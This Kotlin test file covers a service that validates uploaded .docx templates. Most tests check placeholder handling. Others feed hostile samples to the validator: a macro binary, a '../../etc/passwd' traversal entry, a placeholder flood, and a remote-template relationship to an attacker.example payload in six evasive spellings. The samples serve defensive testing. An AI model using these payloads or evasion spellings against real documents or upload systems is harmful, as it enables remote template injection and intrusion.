package com.secman.service

import com.fasterxml.jackson.databind.ObjectMapper
import org.apache.poi.xwpf.usermodel.XWPFDocument
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream
import java.util.zip.ZipOutputStream

class RequirementExportTemplateValidationServiceTest {
    private val service = RequirementExportTemplateValidationService(
        objectMapper = ObjectMapper(),
        maxFileSizeBytes = 5 * 1024 * 1024,
        maxUncompressedSizeBytes = 20 * 1024 * 1024,
        maxZipEntries = 512
    )

    @Test
    fun `valid docx template with requirements placeholder passes`() {
        val report = service.validate(
            bytes = docxTemplate("Intro ${'$'}{documentTitle}\n${'$'}{requirements}"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isTrue()
        assertThat(report.placeholders).contains("documentTitle", "requirements")
        assertThat(report.errors).isEmpty()
    }

    @Test
    fun `docx template without requirements placeholder is rejected by default`() {
        val report = service.validate(
            bytes = docxTemplate("Intro only"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template must include the ${'$'}{requirements} placeholder or use append mode.")
    }

    @Test
    fun `docx template with macro payload is rejected`() {
        val report = service.validate(
            bytes = withExtraZipEntry(docxTemplate("${'$'}{requirements}"), "word/vbaProject.bin"),
            filename = "renamed-macro.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template contains unsupported active or embedded content.")
    }

    @Test
    fun `release metadata placeholders are supported and raise no warning`() {
        val report = service.validate(
            bytes = docxTemplate(
                "${'$'}{releaseName} ${'$'}{releaseVersion} ${'$'}{releaseDate} " +
                    "${'$'}{releaseStatus} ${'$'}{releaseDescription} ${'$'}{requirements}"
            ),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isTrue()
        assertThat(report.placeholders)
            .contains("releaseName", "releaseVersion", "releaseDate", "releaseStatus", "releaseDescription")
        // The warning names every unsupported placeholder, so an empty warning list is the
        // assertion that all five are recognised rather than merely present.
        assertThat(report.warnings).isEmpty()
    }

    @Test
    fun `unknown placeholders warn but do not reject`() {
        val report = service.validate(
            bytes = docxTemplate("${'$'}{companyLogo} ${'$'}{requirements}"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isTrue()
        assertThat(report.warnings).anyMatch { it.contains("companyLogo") }
    }

    @Test
    fun `requirements placeholder inside a table is rejected as an insertion point`() {
        // Requirement content is inserted as body-level paragraphs. A marker in a table cell cannot
        // host them, so the export would silently append everything at the end instead.
        val report = service.validate(
            bytes = docxWithPlaceholderInTable(),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).anyMatch { it.contains("inside a table") }
    }

    @Test
    fun `requirements placeholder inside a table only warns when append mode is allowed`() {
        val report = service.validate(
            bytes = docxWithPlaceholderInTable(),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE,
            requireRequirementsPlaceholder = false
        )

        assertThat(report.valid).isTrue()
        assertThat(report.warnings).anyMatch { it.contains("inside a table") }
    }

    @Test
    fun `requirements placeholder in a header is not accepted as an insertion point`() {
        val report = service.validate(
            bytes = docxWithPlaceholderInHeaderOnly(),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).anyMatch { it.contains("header or footer") }
    }

    @Test
    fun `body level requirements placeholder is accepted even when the template also has tables`() {
        val report = service.validate(
            bytes = docxWithTableThenBodyPlaceholder(),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isTrue()
        assertThat(report.errors).isEmpty()
    }

    @Test
    fun `oversized template is rejected before parsing`() {
        val small = RequirementExportTemplateValidationService(
            objectMapper = ObjectMapper(),
            maxFileSizeBytes = 128,
            maxUncompressedSizeBytes = 20 * 1024 * 1024,
            maxZipEntries = 512
        )

        val report = small.validate(
            bytes = docxTemplate("${'$'}{requirements}"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template exceeds the maximum allowed file size.")
    }

    @Test
    fun `template with too many zip entries is rejected`() {
        val strict = RequirementExportTemplateValidationService(
            objectMapper = ObjectMapper(),
            maxFileSizeBytes = 5 * 1024 * 1024,
            maxUncompressedSizeBytes = 20 * 1024 * 1024,
            maxZipEntries = 2
        )

        val report = strict.validate(
            bytes = docxTemplate("${'$'}{requirements}"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template contains too many files.")
    }

    @Test
    fun `template whose uncompressed size exceeds the cap is rejected`() {
        val strict = RequirementExportTemplateValidationService(
            objectMapper = ObjectMapper(),
            maxFileSizeBytes = 5 * 1024 * 1024,
            maxUncompressedSizeBytes = 64,
            maxZipEntries = 512
        )

        val report = strict.validate(
            bytes = docxTemplate("${'$'}{requirements}"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template uncompressed size exceeds the configured limit.")
    }

    @Test
    fun `zip entry escaping the archive root is rejected`() {
        val report = service.validate(
            bytes = withExtraZipEntry(docxTemplate("${'$'}{requirements}"), "../../etc/passwd"),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template contains an unsafe ZIP entry path.")
    }

    @Test
    fun `template referencing an external target is rejected`() {
        val report = service.validate(
            bytes = withReplacedZipEntry(
                docxTemplate("${'$'}{requirements}"),
                "word/_rels/document.xml.rels",
                """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                   <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
                     <Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
                                   Target="https://attacker.example/payload.dotx" TargetMode="External"/>
                   </Relationships>""".toByteArray()
            ),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("External links, remote images, and remote templates are not allowed.")
    }

    @Test
    fun `non-docx filename is rejected regardless of content`() {
        val report = service.validate(
            bytes = docxTemplate("${'$'}{requirements}"),
            filename = "corporate-template.docm",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Only .docx Word templates are supported.")
    }

    @Test
    fun `empty upload is rejected`() {
        val report = service.validate(
            bytes = ByteArray(0),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template file is empty.")
    }

    @Test
    fun `a file that is not a zip package is rejected`() {
        val report = service.validate(
            bytes = "this is plain text, not OOXML".toByteArray(),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.valid).isFalse()
        assertThat(report.errors).contains("Template is not a valid OpenXML ZIP package.")
    }

    @Test
    fun `a document full of placeholder openers does not stall validation`() {
        // Each split-placeholder probe copies a window and runs a regex over it. Unbounded, a
        // document of repeated "${" turns one upload into tens of GB of work, so the probe count
        // is capped.
        //
        // The assertion is scaling, not wall-clock: an absolute millisecond budget passes on a
        // fast runner even with no cap at all, which is exactly how the first version of this
        // test gave false assurance. With the cap, work is constant past the cap, so a 10x
        // larger flood costs about the same; without it the cost is quadratic in the flood size.
        val small = docxTemplate("\${".repeat(20_000))
        val large = docxTemplate("\${".repeat(200_000))

        val smallNanos = timeValidation(small)
        val largeNanos = timeValidation(large)

        // Generous factor: the zip walk and sha256 still scale linearly with document size, and
        // a 10x uncapped probe loop would be ~100x, far outside this.
        assertThat(largeNanos)
            .describedAs("probe work must be capped, not proportional to the flood size")
            .isLessThan(maxOf(smallNanos * 20, 2_000_000_000L))
    }

    private fun timeValidation(bytes: ByteArray): Long {
        val start = System.nanoTime()
        val report = service.validate(
            bytes = bytes,
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE,
            requireRequirementsPlaceholder = false
        )
        assertThat(report.sha256).isNotEmpty()
        return System.nanoTime() - start
    }

    @Test
    fun `an external relationship target is rejected however it is spelled`() {
        // This is a security control, not hygiene: an external attachedTemplate relationship is
        // fetched by the recipient's Word on open. All of these are legal XML that Word resolves
        // to External, and a plain substring check missed every variant but the first.
        val spellings = listOf(
            """TargetMode="External"""" to "canonical double-quoted",
            """TargetMode='External'""" to "single-quoted",
            """TargetMode = "External"""" to "whitespace around the equals sign",
            """TargetMode="&#69;xternal"""" to "decimal character reference",
            """TargetMode="&#x45;xternal"""" to "hex character reference",
            """targetmode="external"""" to "lower case"
        )

        for ((attribute, label) in spellings) {
            val report = service.validate(
                bytes = withReplacedZipEntry(
                    docxTemplate("${'$'}{requirements}"),
                    "word/_rels/document.xml.rels",
                    """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                       <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
                         <Relationship Id="rId9"
                                       Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
                                       Target="https://attacker.example/payload.dotx" $attribute/>
                       </Relationships>""".toByteArray()
                ),
                filename = "corporate-template.docx",
                contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
            )

            assertThat(report.valid).describedAs("must reject: $label").isFalse()
            assertThat(report.errors)
                .describedAs("must reject: $label")
                .contains("External links, remote images, and remote templates are not allowed.")
        }
    }

    @Test
    fun `an internal relationship target is not mistaken for an external one`() {
        val report = service.validate(
            bytes = withReplacedZipEntry(
                docxTemplate("${'$'}{requirements}"),
                "word/_rels/document.xml.rels",
                """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                   <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
                     <Relationship Id="rId1"
                                   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
                                   Target="styles.xml" TargetMode="Internal"/>
                   </Relationships>""".toByteArray()
            ),
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
        )

        assertThat(report.errors)
            .doesNotContain("External links, remote images, and remote templates are not allowed.")
    }

    @Test
    fun `a requirements marker split across two paragraphs is not treated as an insertion point`() {
        // The renderer joins runs within one paragraph, so a marker spanning a paragraph boundary
        // is one it will never find. Accepting it would pass validation and then silently append
        // at the end of the document instead of rendering at the marker.
        val split = docxTemplate("\${requi", "rements}")

        val report = service.validate(
            bytes = split,
            filename = "corporate-template.docx",
            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE,
            requireRequirementsPlaceholder = true
        )

        assertThat(report.valid).isFalse()
    }

    @Test
    fun `sha256 is stable for identical bytes and differs for different bytes`() {
        val bytes = docxTemplate("${'$'}{requirements}")
        assertThat(service.sha256(bytes)).isEqualTo(service.sha256(bytes.copyOf()))
        assertThat(service.sha256(bytes)).isNotEqualTo(service.sha256(docxTemplate("${'$'}{requirements} v2")))
    }

    /** One body paragraph per supplied line. */
    private fun docxTemplate(vararg lines: String): ByteArray {
        val document = XWPFDocument()
        lines.forEach { document.createParagraph().createRun().setText(it) }
        val output = ByteArrayOutputStream()
        document.write(output)
        document.close()
        return output.toByteArray()
    }

    /** A template whose only `${requirements}` marker sits in a table cell. */
    private fun docxWithPlaceholderInTable(): ByteArray {
        val document = XWPFDocument()
        document.createParagraph().createRun().setText("Cover ${'$'}{documentTitle}")
        val table = document.createTable(1, 1)
        table.getRow(0).getCell(0).paragraphs.first().createRun().setText("${'$'}{requirements}")
        return writeDocument(document)
    }

    /** A template with a table before a body-level `${requirements}` marker. */
    private fun docxWithTableThenBodyPlaceholder(): ByteArray {
        val document = XWPFDocument()
        document.createParagraph().createRun().setText("Cover ${'$'}{documentTitle}")
        val table = document.createTable(2, 2)
        table.getRow(0).getCell(0).paragraphs.first().createRun().setText("Release")
        table.getRow(0).getCell(1).paragraphs.first().createRun().setText("${'$'}{releaseVersion}")
        document.createParagraph().createRun().setText("${'$'}{requirements}")
        return writeDocument(document)
    }

    /** A template whose only `${requirements}` marker sits in the page header. */
    private fun docxWithPlaceholderInHeaderOnly(): ByteArray {
        val document = XWPFDocument()
        document.createParagraph().createRun().setText("Cover ${'$'}{documentTitle}")
        val header = document.createHeader(org.apache.poi.xwpf.usermodel.HeaderFooterType.DEFAULT)
        header.createParagraph().createRun().setText("${'$'}{requirements}")
        return writeDocument(document)
    }

    private fun writeDocument(document: XWPFDocument): ByteArray {
        val output = ByteArrayOutputStream()
        document.write(output)
        document.close()
        return output.toByteArray()
    }

    /** Rewrites one entry of an existing package, leaving the rest byte-for-byte. */
    private fun withReplacedZipEntry(docx: ByteArray, name: String, content: ByteArray): ByteArray {
        val output = ByteArrayOutputStream()
        var replaced = false
        ZipOutputStream(output).use { zipOut ->
            ZipInputStream(ByteArrayInputStream(docx)).use { zipIn ->
                var entry = zipIn.nextEntry
                val buffer = ByteArray(8192)
                while (entry != null) {
                    zipOut.putNextEntry(ZipEntry(entry.name))
                    if (entry.name == name) {
                        zipOut.write(content)
                        replaced = true
                        // Drain the original so the stream stays positioned correctly.
                        while (zipIn.read(buffer) != -1) { /* discard */ }
                    } else {
                        while (true) {
                            val read = zipIn.read(buffer)
                            if (read == -1) break
                            zipOut.write(buffer, 0, read)
                        }
                    }
                    zipOut.closeEntry()
                    entry = zipIn.nextEntry
                }
            }
            if (!replaced) {
                zipOut.putNextEntry(ZipEntry(name))
                zipOut.write(content)
                zipOut.closeEntry()
            }
        }
        return output.toByteArray()
    }

    private fun withExtraZipEntry(docx: ByteArray, name: String): ByteArray {
        val output = ByteArrayOutputStream()
        ZipOutputStream(output).use { zipOut ->
            ZipInputStream(ByteArrayInputStream(docx)).use { zipIn ->
                var entry = zipIn.nextEntry
                val buffer = ByteArray(8192)
                while (entry != null) {
                    zipOut.putNextEntry(ZipEntry(entry.name))
                    while (true) {
                        val read = zipIn.read(buffer)
                        if (read == -1) break
                        zipOut.write(buffer, 0, read)
                    }
                    zipOut.closeEntry()
                    entry = zipIn.nextEntry
                }
            }
            zipOut.putNextEntry(ZipEntry(name))
            zipOut.write(byteArrayOf(1, 2, 3))
            zipOut.closeEntry()
        }
        return output.toByteArray()
    }
}
